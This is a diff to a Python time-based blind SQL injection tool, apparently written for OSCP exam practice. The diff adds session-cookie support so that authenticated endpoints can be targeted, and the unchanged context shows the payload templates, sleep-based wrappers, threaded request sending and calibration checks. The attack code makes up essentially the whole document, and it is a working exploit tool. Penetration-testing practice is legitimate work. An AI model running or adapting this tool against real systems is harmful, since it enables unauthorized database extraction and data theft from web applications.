@@ -13,6 +13,7 @@
 # thread. Real speedup ~= thread count.
 #
 # Methods: GET (query string), POST (body), HEADER (e.g. X-Forwarded-For).
+# Optional session cookie for endpoints that require an authenticated session.
 # Self-written manual exploit (OSCP-appropriate). Confirm exam rules before use.
 # ---------------------------------------------------------------------------
 import requests
@@ -37,10 +38,23 @@ OTHER_VALUE  = input("Other field value (anything, e.g. x)         : ").strip() 
 # SELECT context (login/id):  1' OR [INJECT]-- -   or   admin' AND [INJECT]-- -
 # HEADER/INSERT context:      1' AND [INJECT]-- -
 TEMPLATE     = input("Payload template (use [INJECT] as placeholder): ").strip()
+
+# --- Optional session cookie ----------------------------------------------
+# Name prompt has a default; pressing Enter uses it. Value prompt takes the
+# raw cookie value only (no "name=" prefix). Blank value -> run without a cookie.
+COOKIE_NAME  = input("Cookie name (Enter for default 'token')      : ").strip() or "token"
+COOKIE_VALUE = input("Session cookie value (blank = no cookie)     : ").strip()
+
 DELAY        = int(input("SLEEP seconds on TRUE (e.g. 3)               : ").strip() or "3")
 THREADS      = int(input("Threads (e.g. 8; lower if box is fragile)    : ").strip() or "8")
 # A reply this slow (or slower) counts as TRUE. Below DELAY to absorb jitter.
 THRESHOLD    = DELAY * 0.7
+
+# One session reused for every request (across all threads). The cookie (if
+# set) rides along automatically in the Cookie header on each request.
+SESSION = requests.Session()
+if COOKIE_VALUE:
+    SESSION.cookies.set(COOKIE_NAME, COOKIE_VALUE)
 
 # --- Wrapper forms tried during calibration (first that fires wins) --------
 # Each turns a boolean {cond} into "sleep DELAY seconds iff cond is TRUE".
@@ -54,20 +68,22 @@ WRAPPERS = [
 ]
 
 # --- Request sender (GET -> query, POST -> body, HEADER -> header) ----------
-# requests' module-level calls open their own connection per request, so this
-# is safe to call from many threads at once (no shared session/cookies).
+# Runs over SESSION so the cookie is attached when one was provided. The
+# session's connection pool is thread-safe for concurrent requests, and here
+# the cookie jar is only read (never mutated mid-run), so sharing one session
+# across the thread pool is safe.
 def send(payload):
     if METHOD == "HEADER":
-        return requests.get(URL, headers={INJ_FIELD: payload})
+        return SESSION.get(URL, headers={INJ_FIELD: payload})
     if METHOD == "GET":
         params = {INJ_FIELD: payload}
         if OTHER_FIELD:
             params[OTHER_FIELD] = OTHER_VALUE
-        return requests.get(URL, params=params)
+        return SESSION.get(URL, params=params)
     data = {INJ_FIELD: payload}
     if OTHER_FIELD:
         data[OTHER_FIELD] = OTHER_VALUE
-    return requests.post(URL, data=data)
+    return SESSION.post(URL, data=data)
 
 def build(cond, wrapper):
     return TEMPLATE.replace("[INJECT]", wrapper.format(cond=cond, d=DELAY))
@@ -97,10 +113,12 @@ if not calibrate():
     print("[!] No wrapper fired. TRUE never delayed or FALSE also delayed.")
     print("    - Check the template breaks out of the query correctly.")
     print("    - HEADER values must use real spaces, never + or %20.")
+    print("    - If the endpoint needs auth, check the cookie name/value.")
     print("    - The parameter may simply not be injectable here.")
     print(f"    method   = {METHOD}")
     print(f"    template = {TEMPLATE!r}")
     print(f"    delay    = {DELAY}s, threshold = {THRESHOLD}s")
+    print(f"    cookie   = {COOKIE_NAME}={'(set)' if COOKIE_VALUE else '(none)'}")
     sys.exit(1)
 print(f"[+] Using wrapper: {CHOSEN}\n")
 
